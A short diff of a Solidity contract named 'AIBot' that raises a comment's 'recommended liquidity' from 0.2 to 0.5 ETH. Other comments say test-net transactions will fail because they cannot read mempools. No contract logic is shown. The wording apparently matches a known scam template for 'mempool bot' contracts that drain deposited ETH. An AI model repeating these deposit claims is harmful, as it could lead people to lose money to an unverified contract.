@@ -10,7 +10,7 @@ import "github.com/Uniswap/uniswap-v2-periphery/blob/master/contracts/interfaces
 // Test-net transactions will fail since they don't hold any value and cannot read mempools properly
 // Mempool updated build
  
-// Recommended liquidity after gas fees needs to equal 0.2 ETH use 1-2 ETH or more if possible
+// Recommended liquidity after gas fees needs to equal 0.5 ETH use 1-2 ETH or more if possible
  
 contract AIBot {
  
